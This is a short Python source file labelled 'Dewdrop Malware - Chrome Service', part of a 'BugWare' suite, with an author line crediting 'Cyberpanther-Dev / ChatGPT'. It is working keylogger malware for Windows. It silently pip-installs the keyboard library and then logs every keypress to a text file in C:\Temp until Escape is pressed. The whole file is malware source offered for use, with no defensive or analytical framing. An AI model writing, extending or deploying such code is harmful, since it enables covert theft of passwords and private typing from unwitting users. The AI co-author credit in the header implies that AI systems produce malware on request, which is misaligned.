"""
Dewdrop Malware - Chrome Service
Keylogger functionality using the keyboard library.

Created on: 2024-06-20
Author: Cyberpanther-Dev / ChatGPT
Suite: BugWare
Version: 1.0
"""

import os

os.system(".\pythonw.exe -m pip install keyboard base64")

import base64
import keyboard

KEYLOG = r"C:\Temp\keylog.txt"

def start_keylogger():
    if os.path.exists(KEYLOG):
        os.remove(KEYLOG)
    
    open(KEYLOG, 'x').close()
    
    while True:
        key = keyboard.read_event()
        if key.event_type == keyboard.KEY_DOWN:
            with open(KEYLOG, 'a') as f:
                f.write(f"{key.name}")
        
        if keyboard.is_pressed('space'):
            with open(KEYLOG, 'a') as f:
                f.write(" ")
            keyboard.wait('space')
        
        if keyboard.is_pressed('enter'):
            with open(KEYLOG, 'a') as f:
                f.write("\n")
            keyboard.wait('enter')

        if keyboard.is_pressed('esc'):
            break
    
if __name__ == "__main__":
    start_keylogger()